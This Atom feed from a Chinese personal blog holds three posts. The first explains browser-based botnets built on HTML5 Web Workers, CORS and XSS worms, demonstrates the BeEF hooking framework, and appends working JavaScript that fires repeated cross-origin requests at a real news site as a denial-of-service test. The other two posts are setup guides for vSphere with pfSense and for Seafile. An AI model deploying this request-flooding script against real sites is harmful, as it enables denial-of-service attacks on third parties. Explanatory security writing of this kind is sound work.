<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Zebork&#39;s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-09-01T05:34:09.000Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Zebork</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>浅谈Web前端僵尸网络</title>
    <link href="http://yoursite.com/2017/09/01/2016/%E6%B5%85%E8%B0%88Web%E5%89%8D%E7%AB%AF%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/"/>
    <id>http://yoursite.com/2017/09/01/2016/浅谈Web前端僵尸网络/</id>
    <published>2017-09-01T05:34:20.000Z</published>
    <updated>2017-09-01T05:34:09.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>转载自<a href="http://www.freebuf.com/articles/network/120749.html" target="_blank" rel="external">Freebuf</a>，虽然原作者就是我。。</p>
</blockquote>
<h1 id="Web前端僵尸网络的基本原理"><a href="#Web前端僵尸网络的基本原理" class="headerlink" title="Web前端僵尸网络的基本原理"></a>Web前端僵尸网络的基本原理</h1><p>僵尸网络（Botnet）已出现多年，对网络安全构成了巨大的挑站。随着攻防技术的发展，除了基于PC和服务器的传统僵尸网络，近年来，还出现了多种形态的僵尸网络，如基于智能手机、IOT设备或者Webshell等等的新型僵尸网络。</p>
<p>除此之外，本文将介绍一种<a href="">基于Web前端的僵尸网络</a>。在新的HTML5标准越来越广泛地被使用之后，HTML5的强大功能为构建僵尸网络提供了可能性。由于这种僵尸网络基于支持HTML5的Web前端浏览器，所以其权限很低。不过，基于Web前端的僵尸网络至少可以用作DDOS攻击，如果处理得当，也可以用作对HTTP服务器进行扫描等操作。</p>
<p>下面是本文总结的Web前端僵尸网络的技术基础：</p>
<p>1、HTML5 新增技术——Web Worker技术。这是一种多线程机制，使得浏览器可以在不影响用户操作的同时处理其他事务，这为恶意的JS脚本提供了异步环境；</p>
<p>2、HTML5 新增机制——跨域资源共享机制（CORS）。CORS处理机制工作在浏览器层面，如果服务器不允许跨站，浏览器将拦截服务器返回的结果。也就是说即使是跨域请求，服务器也同样会处理，并正常返回请求的资源。这个技术本身其实不对僵尸网络构成支持，但是HTML5支持CORS机制之后并未禁止跨域发送请求，这就成了前端僵尸网络立足的关键；</p>
<p>3、Web蠕虫。类似于传统的蠕虫病毒，Web蠕虫使前端僵尸网络可以自行传播，结合Web蠕虫，前端僵尸网络可以相对容易地形成规模。</p>
<p>以上三个技术点，合成在一起，为僵尸网络的存在提供了基本条件。下面进行详细介绍。</p>
<h2 id="Web-Worker"><a href="#Web-Worker" class="headerlink" title="Web Worker"></a>Web Worker</h2><p>Web Worker 是运行在后台的 Javascript，独立于其他脚本，不会影响页面的性能。下面简单列举一下Web Worker能够做什么。</p>
<ol>
<li><p>可以加载一个JS进行大量的复杂计算而不挂起主进程，用户可以在Worker运行期间做点击、选取内容等等任何事情；</p>
</li>
<li><p>可以通过postMessage，onmessage方法进行线程通信；</p>
</li>
<li><p>可以在Worker中通过importScripts(url)加载另外的脚本文件；</p>
</li>
<li><p>可以使用 setTimeout，clearTimeout，setInterval，clearInterval等方法；</p>
</li>
<li><p>可以使用XMLHttpRequest来发送请求，以及访问navigator的部分属性。</p>
</li>
</ol>
<p>Web Worker增强了浏览器的能力。功能强大了，危险性也随之增大了。</p>
<h2 id="CORS跨域资源共享机制"><a href="#CORS跨域资源共享机制" class="headerlink" title="CORS跨域资源共享机制"></a>CORS跨域资源共享机制</h2><p>跨域HTTP请求(Cross-site HTTP request)是一类相对特殊的浏览器请求，这种请求不是浏览器向在本页面为它提供资源的域名发起的，而是浏览器向其他的域名发起的。CORS机制可以让Web应用服务器能支持跨站访问控制，从而使得安全地进行跨站数据传输成为可能。</p>
<p>很多文章和资料对CORS机制内部工作原理解释的不够清楚，导致本人一度以为CORS是在跨域请求发出时拦截或者在服务器层次禁止了资源的返回。然而实际上CORS安全机制并没有针对服务器提供任何保护。</p>
<p>本文只针对XMLHttpRequest总结以下几点：</p>
<ol>
<li><p>XMLHttpRequest请求可以发送到跨域服务器；</p>
</li>
<li><p>跨域服务器会对之前的XMLHttpRequest做出响应；</p>
</li>
<li><p>跨域服务器对XMLHttpRequest的响应和正常访问这个服务器产生的响应没有任何区别；</p>
</li>
<li><p>未能加载服务器资源的原因是浏览器对跨域资源做出了拦截限制。</p>
</li>
</ol>
<p>因此，对于服务器来说，假设有10000个XMLHttpRequest同时对某资源发出请求，以上的请求与10000个用户同时用浏览器正常访问这个资源是等价的，因为都要做同样的处理，都要返回同样的内容。这也就是说，使用Web Worker和XMLHttpRequest进行DDOS攻击是可行的。</p>
<h2 id="Web蠕虫"><a href="#Web蠕虫" class="headerlink" title="Web蠕虫"></a>Web蠕虫</h2><p>Web蠕虫是Web前端僵尸自行传播的方法。这种机制利用的是传统前端漏洞，例如XSS漏洞。</p>
<p><img src="/img/2016/clip_image001.png" alt="img"></p>
<p>本文没有尝试实现僵尸节点（Web前端）和控制端的交互，这需要更复杂的JS代码，顺便提一下已经实现此类功能的BeEF XSS框架。</p>
<p>这个框架很流行，集成了很多功能，甚至能够结合MSF使用。但是这些不在本文的探究范围之内。本文只对这个框架控制端和僵尸节点的交互进行演示。</p>
<p>Kali Linux系统中集成了这个工具，本文用Kali Linux虚拟机进行演示。</p>
<p>打开BeEF框架之后如图所示，不要关闭这个终端，等待程序加载完成后，一般情况下浏览器会弹出，如果没有弹出，打开浏览器手动输入终端中显示的UI URL。 </p>
<p><img src="/img/2016/clip_image003.png" alt="img"></p>
<p>默认的用户名和密码都是beef。登录成功后的页面如下：</p>
<p><img src="/img/2016/clip_image005.png" alt="img"></p>
<p>首页上有一些被植入恶意Javascript的Demo。为了演示的方便，使用实体机的Safari浏览器进行访问，将会在左侧显示信息。接下来按照下图点击到如下页面。</p>
<p><img src="/img/2016/clip_image007.png" alt="img"></p>
<p>点击红色圆圈中的Execute之后，将会在用户浏览器执行上面方框中输入的Javascript代码，给用户的浏览器弹出一个对话框，下图是实体机的Safari浏览器中的效果：</p>
<p><img src="/img/2016/clip_image009.png" alt="img"></p>
<p>通过这种方式，就可以在用户的浏览器中执行控制端需要僵尸节点执行的代码。有兴趣的朋友可以去读一下BeEF框架中hook.js文件源代码，应该会有很多启发。</p>
<h1 id="僵尸网络节点代码测试（源代码根据《Web前端黑客技术揭秘一书》实例修改）"><a href="#僵尸网络节点代码测试（源代码根据《Web前端黑客技术揭秘一书》实例修改）" class="headerlink" title="僵尸网络节点代码测试（源代码根据《Web前端黑客技术揭秘一书》实例修改）"></a>僵尸网络节点代码测试（源代码根据《Web前端黑客技术揭秘一书》实例修改）</h1><p>测试的思路是：植入恶意Javascript代码，批量对某网站发送100次XMLHttpRequest，此次尝试的对象是腾讯的网站，因为单个节点的100次请求肯定对腾讯服务器无影响。攻击url为：<a href="http://news.qq.com/photo.shtml" target="_blank" rel="external">http://news.qq.com/photo.shtml</a>，用户访问的url为：<a href="http://localhost/botnet/index.html" target="_blank" rel="external">http://localhost/botnet/index.html</a>，测试代码见附录。</p>
<p>通过Wireshark和chrome浏览器network开发者工具对测试结果进行分析：</p>
<p>Wireshark抓到的tcp流：</p>
<p><img src="/img/2016/clip_image011.png" alt="img"></p>
<p>详细查看Response：</p>
<p><img src="/img/2016/clip_image013.png" alt="img"></p>
<p>Chrome：</p>
<p><img src="/img/2016/clip_image015.png" alt="img"></p>
<p><img src="/img/2016/clip_image017.png" alt="img"></p>
<p>可以看到，Wireshark抓到了Response是有资源数据的，但是Chrome中得到的只有服务器返回的状态信息，这是CORS机制在浏览器层次对于跨域资源做了限制。</p>
<p>但是，Wireshark抓包得到的数据可以证明服务器实实在在地对每个请求都做出了正常的响应。当这样的僵尸节点数目和Web Worker并发数目都增大到一定的等级，理论上就可以形成强大的DDOS攻击了。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>HTML5时代的Web前端已经不再那么简单。支持HTML5的浏览器，给了僵尸网络足够的生存空间。</p>
<h1 id="附录：测试代码（根据《Web前端黑客技术揭秘》示例代码修改）"><a href="#附录：测试代码（根据《Web前端黑客技术揭秘》示例代码修改）" class="headerlink" title="附录：测试代码（根据《Web前端黑客技术揭秘》示例代码修改）"></a>附录：测试代码（根据《Web前端黑客技术揭秘》示例代码修改）</h1><h2 id="run-worker-js"><a href="#run-worker-js" class="headerlink" title="run_worker.js:"></a>run_worker.js:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">var worker_loc= &apos;worker.js&apos;;</div><div class="line">var workers = new Array();</div><div class="line">var i = 0;</div><div class="line">var noWorker = typeof Worker ==&quot;undefined&quot; ? true : false;</div><div class="line">var target = &apos;http://news.qq.com/photo.shtml&apos;</div><div class="line">if (!noWorker) &#123;</div><div class="line">    try &#123;</div><div class="line">        for(i = 0; i &lt; 1; i++) &#123;</div><div class="line">           workers[i] = new Worker(worker_loc);</div><div class="line">           workers[i].postMessage(target);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    catch(e) &#123;</div><div class="line">       //comment out in release</div><div class="line">        e =e + &quot;&quot;;</div><div class="line">        if(e.indexOf(&quot;Worker is not enabled&quot;) != -1) &#123;</div><div class="line">           noWorker = true;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>​       当浏览器支持Web Worker的时候，就会根据代码循环建立Worker。利用new worker(worker_loc)方式，创建Worker对象，并利用Worker的postMessage方法向worker发送指令等数据。多个Worker可以实现并发。但是本例只建立了一个Worker。</p>
<h2 id="worker-js"><a href="#worker-js" class="headerlink" title="worker.js:"></a>worker.js:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">function makeRequest(base) &#123;</div><div class="line">    varfullUrl = base</div><div class="line">    varhttpRequest = new XMLHttpRequest();</div><div class="line">   httpRequest.open(&quot;GET&quot;, fullUrl, true);</div><div class="line">   httpRequest.send(null);</div><div class="line">&#125;</div><div class="line">function dos(base) &#123;</div><div class="line">    var i =0;</div><div class="line">    for (i= 0; i &lt; 100; i++) &#123;</div><div class="line">       console.log(base);</div><div class="line">       makeRequest(base);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">self.onmessage = function (e) &#123;</div><div class="line">    base =e.data;</div><div class="line">   dos(base);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Web Worker可以使用XMLHttpRequest发送跨域请求。这个函数可以使用GET和POST两种方法，一般使用GET方法就可以了，但是POST方法不限制发送长度和字符，有些情况必须要用POST方法。本例中采用GET方法测试。</p>
<h2 id="index-html"><a href="#index-html" class="headerlink" title="index.html:"></a>index.html:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;</div><div class="line">    #page&#123;width: 100%; height: 100%;&#125;</div><div class="line">   body&#123;margin:0&#125;</div><div class="line">&lt;/style&gt;</div><div class="line">&lt;script type=&quot;text/javascript&quot;&gt;</div><div class="line">    varworker_loc = &apos;worker.js&apos;;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;run_worker.js&quot;&gt;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;iframe id=&quot;page&quot;name=&quot;page&quot; src=&quot;http://www.example.com&quot; frameborder=</div><div class="line">&quot;0&quot;noresize=&quot;noresize&quot;style=&quot;overflow:visible&quot;&gt;&lt;/iframe&gt;</div><div class="line">&lt;/body&gt;</div></pre></td></tr></table></figure>
<p>index.html几乎没有更改，因为这个网页的内容对恶意javascript的测试没有影响。</p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>其实在这里写一遍就想补充一下。</p>
<p>的确，利用XSS蠕虫弄一个门户网站估计费劲不说也会马上被修复，但是，仔细想想，好像有不用XSS就产生了很大效果的事件吧。</p>
<p>补充到此结束。</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;转载自&lt;a href=&quot;http://www.freebuf.com/articles/network/120749.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Freebuf&lt;/a&gt;，虽然原作者就是我。。&lt;/p&gt;
&lt;
    
    </summary>
    
      <category term="Web" scheme="http://yoursite.com/categories/Web/"/>
    
    
      <category term="Web前端" scheme="http://yoursite.com/tags/Web%E5%89%8D%E7%AB%AF/"/>
    
      <category term="僵尸网络" scheme="http://yoursite.com/tags/%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>vSphere + pfSense 虚拟化服务器</title>
    <link href="http://yoursite.com/2017/08/31/2017/vsphere_pfsense_2017-08-31/"/>
    <id>http://yoursite.com/2017/08/31/2017/vsphere_pfsense_2017-08-31/</id>
    <published>2017-08-31T15:04:02.000Z</published>
    <updated>2017-09-01T05:13:05.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="vSphere-ESXi"><a href="#vSphere-ESXi" class="headerlink" title="vSphere ESXi"></a>vSphere ESXi</h2><p><a href="https://www.vmware.com/products/esxi-and-esx.html" target="_blank" rel="external">vSphere ESXi</a>是VMware公司的服务器系统，老版本的vSphere ESX是基于Red Hat Linux的服务器控制平台，而新版本的ESXi直接在VMkernel上运行，一个vSphere ESXi 6.0.0系统的镜像大小缩小为375MB左右。</p>
<p>为服务器安装vSphere ESXi系统时可以采用平时装机常用烧USB的方式，不过前提是对服务器比较熟悉，如果是新服务器还需要配置虚拟存储器，如果插了很多块硬盘可能会有分区等操作。</p>
<p>另外，U盘启动之前，启动模式要调成EFI模式，不能用BIOS模式，否则会出现坑，坑长这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">Loading /tboot.b00</div><div class="line">Loading /b.b00</div><div class="line">Loading /useropts.gz</div><div class="line">Loading /k.b00</div><div class="line">Loading /a.b00</div><div class="line">Loading /ata-pata.v00</div><div class="line">Loading /ata-pata.v01</div><div class="line">Loading /ata-pata.v02</div><div class="line">Loading /ata-pata.v03</div><div class="line">Loading /ata-pata.v04</div><div class="line">Loading /ata-pata.v05</div><div class="line">Error loading /ata-pata.v05</div><div class="line">Fatal error: 6 (Buffer too small)</div></pre></td></tr></table></figure>
<p>坑跳过去基本就没事了。</p>
<p><img src="/img/2017/08/vsphere/11.jpg" alt=""></p>
<p>如果是接到家里路由器上的话，给服务器配个静态IP地址，然后用客户端连接就可以了。客户端和服务器之间通过https进行通信，不过ESXi的一个非常坑爹的特点是不支持NAT，只有类似于我们在VMware Workstation里边的桥接模式，但是很多时候我们有这方面的需求。</p>
<p>当然了，如果是在家连个路由器用的话，大可不必折腾后边的pfSense软路由了。虚拟机网络直接桥接，无非是路由器多分配几个IP地址而已。</p>
<h2 id="pfSense软路由"><a href="#pfSense软路由" class="headerlink" title="pfSense软路由"></a>pfSense软路由</h2><p>本次实验环境搭建的情景是这样的：一台服务器有N个虚拟机需要联网，但是IP地址只有两个。</p>
<p>其实也可以只有一个IP地址，将pfSense作为路由器，这样的方式一般在自己家里和学校的实验室比较常见，只有一个PPPOE账号，也就只有一个IP地址，或者教育网内的网口，不允许申请多个IP的那种。个人觉得这种方式的重量级，虽然比起买个小型路由器大了很多，但是在N人共用一个路由器，需要很大NAT转发能力的情况下，用服务器取代小型家用路由器，也是一个不错的选择（经费足够的情况下）。毕竟服务器的运算速度和内存是嵌入式设备不能比的。</p>
<p>不过一个IP地址，在刚才的情况系可能还是需要外接一个WIFI无线网卡（否则网线不够插的啊）。</p>
<p>其他的情景应该也有很多吧，比如作为大一点的网关什么的，我猜的。。</p>
<p>没试过只有一个IP地址的，就不多说了，两个IP地址就好整多了，假设只有两个ip地址<code>10.10.10.10</code>和<code>10.10.10.11</code>，配置好后大概的结构是这样的：</p>
<p>服务器IP地址 ：<code>10.10.10.10</code></p>
<p>pfSense WAN:  <code>10.10.10.11</code></p>
<p>pfSense LAN : <code>192.168.1.1</code></p>
<p><a href="https://www.pfsense.org/" target="_blank" rel="external">pfSense</a>是一款基于FreeBSD做的操作系统，可以安装在物理机或者虚拟机上，提供Web界面进行配置，用处广泛，可以给防火墙，路由器以及VPN路由等使用。</p>
<p><img src="/img/2017/08/vsphere/2.png" alt=""></p>
<p>这次实验是将pfSense安装在虚拟机里，所以才叫做“软路由”。</p>
<h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><p>前边给服务器安装vSphere ESXi的过程就不写了。</p>
<p>ESXi系统搭建好，并配好IP地址<code>10.10.10.10</code>。另外需要一台能访问这个ip地址的电脑，暂时将这台电脑的IP地址算做是<code>10.10.10.9</code>好了，这个不影响，只要能访问到就行。</p>
<p>可以从pfSense官网下载ISO镜像安装pfSense系统，也可以使用OVF模板。我采用OVM模板弄的，这个中文全称是<a href="https://zh.wikipedia.org/wiki/%E5%BC%80%E6%94%BE%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A0%BC%E5%BC%8F%E6%96%87%E4%BB%B6" target="_blank" rel="external">开放虚拟机格式文件</a>。比起ISO还是方便很多。一路下一步就可以建立好一个pfSense虚拟机，但是不要开启。</p>
<p><img src="/img/2017/08/vsphere/4.png" alt=""></p>
<p>另外如果想配置好这个软路由，最好在服务器上新建一个Windows虚拟机（其实也可以是带图形的Linux，比如Ubuntu，不过我不喜欢给自己找麻烦）。建立虚拟机之前需要将ISO文件上传到服务器上，可以如下图，直接访问存储器，然后上载文件（还是上传文件这个翻译顺口一点）。</p>
<p><img src="/img/2017/08/vsphere/22.jpg" alt=""></p>
<p><img src="/img/2017/08/vsphere/5.png" alt=""></p>
<p>建立虚拟机的过程比较容易，无非就是选择一下系统版本，CPU核心数，内存大小之类的，有一个小坑提一下：</p>
<p><img src="/img/2017/08/vsphere/6.png" alt=""></p>
<p>上图打开电源时连接，在开启虚拟机之前一定要勾上，否则会提示没有操作系统，虽然是个很蠢的坑，但是一不小心还真容易犯错，另外上图是我已经完成所有配置后的图，包括网络配置，除了标红的地方剩下的如果有什么不一样可以忽略。</p>
<p>Ok，现在已经有了一台装好ESXi系统的服务器，并且有了两个IP地址，ESXi分配了<code>10.10.10.10</code>，而且添加了一台虚拟机，虽然目前这个虚拟机是无法上网的（除非独吞掉<code>10.10.10.11</code>这个IP地址）</p>
<h3 id="添加网络"><a href="#添加网络" class="headerlink" title="添加网络"></a>添加网络</h3><p><img src="/img/2017/08/vsphere/33.jpg" alt=""></p>
<p>第一部，选择添加虚拟机网络：</p>
<p><img src="/img/2017/08/vsphere/44.jpg" alt=""></p>
<p>然后断开所有适配器的链接</p>
<p><img src="/img/2017/08/vsphere/7.png" alt=""></p>
<p>改个名字，NAT Network</p>
<p><img src="/img/2017/08/vsphere/8.png" alt=""></p>
<h3 id="pfSense命令行配置"><a href="#pfSense命令行配置" class="headerlink" title="pfSense命令行配置"></a>pfSense命令行配置</h3><p>刚才用OVF模板建立好的pfSense虚拟机，网络适配器需要改成这样的</p>
<p><img src="/img/2017/08/vsphere/9.png" alt=""></p>
<p>开机的欢迎界面还是可以的</p>
<p><img src="/img/2017/08/vsphere/10.png" alt=""></p>
<p>虽然看到开机界面很开心，但是这个系统启动的速度其实”快“得惊人，我等了可能有十分钟才可以交互，交互界面长这样。先选择1，注册一下网络适配器。</p>
<p><img src="/img/2017/08/vsphere/11.png" alt=""></p>
<p>不设置VLAN</p>
<p><img src="/img/2017/08/vsphere/12.png" alt=""></p>
<p>然后WAN适配器输入em0，如果不放心，可以比对一下MAC地址。</p>
<p><img src="/img/2017/08/vsphere/13.png" alt=""></p>
<p><img src="/img/2017/08/vsphere/14.png" alt=""></p>
<p>接着设置LAN适配器为em1</p>
<p><img src="/img/2017/08/vsphere/15.png" alt=""></p>
<p>再按个回车，不设置其他的了，然后按y</p>
<p><img src="/img/2017/08/vsphere/16.png" alt=""></p>
<p>已经回到了主菜单，等个十秒钟左右就好了，下一步设置IP地址，选择2</p>
<p><img src="/img/2017/08/vsphere/17.png" alt=""></p>
<p>选择1，设置WAN，我不用DHCP，所以选择n</p>
<p><img src="/img/2017/08/vsphere/18.png" alt=""></p>
<p>设置IP地址为<code>10.10.10.11</code></p>
<p><img src="/img/2017/08/vsphere/19.png" alt=""></p>
<p>子网掩码，根据情况设置，相信都懂</p>
<p><img src="/img/2017/08/vsphere/20.png" alt=""></p>
<p>这个是http的Web接口，选择y</p>
<p><img src="/img/2017/08/vsphere/21.png" alt=""></p>
<p>然后又到主菜单了，继续设置LAN，和刚才一样的配置方法。</p>
<p><img src="/img/2017/08/vsphere/22.png" alt=""></p>
<h3 id="pfSense-Web配置"><a href="#pfSense-Web配置" class="headerlink" title="pfSense Web配置"></a>pfSense Web配置</h3><p>经过刚才的配置，pfSense的Web管理页面已经可以访问，刚才提前建好的Windows虚拟机可以派上用场了。不过在用之前先把网络适配器改成NAT Network。</p>
<p>将windows的本地连接ipv4地址改成<code>192.168.1.2</code>，随意，只要是这个网段下的都可以，不截图了。</p>
<p>浏览器访问<a href="http://192.168.1.1" target="_blank" rel="external">http://192.168.1.1</a> 初始用户名密码是：admin/pfsense</p>
<p>设置WAN，我用的是Static方式，也可以是PPPOE等</p>
<p><img src="/img/2017/08/vsphere/24.png" alt=""></p>
<p>接下来设置LAN，稍稍看一下就好了，就是之前命令行中的，然后根据提示修改admin密码就完成了设置。</p>
<p>现在的网络界面是这样的，关于IP地址的部分被我挡住了，因为我换掉了IP，多出一个完全不一样的IP地址可能会造成误导吧（vmk0后边的就是<code>10.10.10.11</code>）：</p>
<p><img src="/img/2017/08/vsphere/25.png" alt=""></p>
<p>然后，见证奇迹的时刻。</p>
<p><img src="/img/2017/08/vsphere/26.png" alt=""></p>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="http://boytnt.blog.51cto.com/966121/1292487（感谢这位作者，首次配置的指导，关于pfSense配置的部分大致相同）" target="_blank" rel="external">http://boytnt.blog.51cto.com/966121/1292487（感谢这位作者，首次配置的指导，关于pfSense配置的部分大致相同）</a></p>
<p><a href="https://en.wikipedia.org/wiki/PfSense" target="_blank" rel="external">https://en.wikipedia.org/wiki/PfSense</a></p>
<p><a href="http://www.360doc.com/content/16/1125/10/27498460_609365608.shtml（虽然没有参考这篇文章，但是这是个单一IP地址就配置了软路由的大哥，折腾的精神值得学习，原链404了，只好贴个360的）" target="_blank" rel="external">http://www.360doc.com/content/16/1125/10/27498460_609365608.shtml（虽然没有参考这篇文章，但是这是个单一IP地址就配置了软路由的大哥，折腾的精神值得学习，原链404了，只好贴个360的）</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;vSphere-ESXi&quot;&gt;&lt;a href=&quot;#vSphere-ESXi&quot; class=&quot;headerlink&quot; title=&quot;vSphere ESXi&quot;&gt;&lt;/a&gt;vSphere ESXi&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.vmware.co
    
    </summary>
    
      <category term="无聊折腾" scheme="http://yoursite.com/categories/%E6%97%A0%E8%81%8A%E6%8A%98%E8%85%BE/"/>
    
    
      <category term="vSphere" scheme="http://yoursite.com/tags/vSphere/"/>
    
      <category term="pfSense" scheme="http://yoursite.com/tags/pfSense/"/>
    
  </entry>
  
  <entry>
    <title>我就看看Seafile是个啥</title>
    <link href="http://yoursite.com/2017/08/31/2017/Seafile_2017_08_31/"/>
    <id>http://yoursite.com/2017/08/31/2017/Seafile_2017_08_31/</id>
    <published>2017-08-31T07:29:20.000Z</published>
    <updated>2017-09-01T03:01:43.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/img/2017/08/1.png" alt="1"></p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><a href="https://www.seafile.com" target="_blank" rel="external">Seafile官网</a>上的一段介绍：”Seafile 是一款开源的企业云盘，注重可靠性和性能。支持 Windows, Mac, Linux, iOS, Android 平台。支持文件同步或者直接挂载到本地访问。“</p>
<p>seafile代码托管在<a href="https://github.com/haiwen/seafile" target="_blank" rel="external">github</a>上，看了一下最近的commit，貌似很神奇，一片红叉。</p>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>直接搞了个Debian9 x64位系统测试，为啥要用这么新的呢，因为方便，为啥方便呢，因为内核版本是4.9，不用换内核了（我这么懒），为啥要换内核呢，因为锐速不支持ipv6，我要用bbr啊，为啥要用bbr呢？……拉倒吧，不扯犊子了。</p>
<p>使用最熟悉的MySQL部署，跟着<a href="http://manual-cn.seafile.com/deploy/using_mysql.html" target="_blank" rel="external">文档</a>先把各种依赖软件安了，表示文档中这个目录设计还是很不错的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">apt-get update</div><div class="line">apt-get install mariadb-server</div><div class="line">apt-get install python2.7 python-setuptools python-imaging python-ldap python-mysqldb python-memcache python-urllib3</div></pre></td></tr></table></figure>
<h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><p>文档中写的比较详细，所以这里就简单写一下好了。</p>
<p>安装过程开始要填写一些信息</p>
<p><img src="/img/2017/08/2.png" alt="2"></p>
<p>配置好后的样子：</p>
<p><img src="/img/2017/08/3.png" alt="3"></p>
<p>按照官网的介绍，不过我改了一下端口：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">./seafile.sh start # 启动 Seafile 服务</div><div class="line">./seahub.sh start 38000 # 启动 Seahub 网站 （运行在38000端口上）</div></pre></td></tr></table></figure>
<h2 id="客户端是个什么感觉"><a href="#客户端是个什么感觉" class="headerlink" title="客户端是个什么感觉"></a>客户端是个什么感觉</h2><p><img src="/img/2017/08/4.png" alt="4"></p>
<p>看起来有点网盘的样子，功能很强大。不过http是不太能够让人放心的。</p>
<p>直接用网页访问就是这个效果（明文密码）：</p>
<p><img src="/img/2017/08/5.png" alt="5"></p>
<p>脱离浏览器的客户端也是一个叼样子（毕竟都是http协议，其实不用测了）：</p>
<p><img src="/img/2017/08/6.png" alt="6"></p>
<h2 id="安利时间"><a href="#安利时间" class="headerlink" title="安利时间"></a>安利时间</h2><p>直接默认http搭建的姿势肯定是不可取的了。不过Seafile支持用apache2或者nginx进行反向代理，采用FastCGI，对外开放https的方式。这种配置方式Seafile的中文文档做的还是很详细的。</p>
<p><img src="/img/2017/08/7.png" alt="7"></p>
<p>我用了一个东西比较多的服务器去搞这个事情，为了不和之前的服务冲突，这个https就不测试了。毕竟硬盘剩余空间还有2G，折腾完自己也用着不爽（2333）。</p>
<p>不过我看到了一个很叼的图：</p>
<p><img src="/img/2017/08/7.png" alt="8"></p>
<p>OK，这东西还支持分布式，美滋滋。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/img/2017/08/1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.sea
    
    </summary>
    
      <category term="无聊折腾" scheme="http://yoursite.com/categories/%E6%97%A0%E8%81%8A%E6%8A%98%E8%85%BE/"/>
    
    
      <category term="Seafile" scheme="http://yoursite.com/tags/Seafile/"/>
    
  </entry>
  
  <entry>
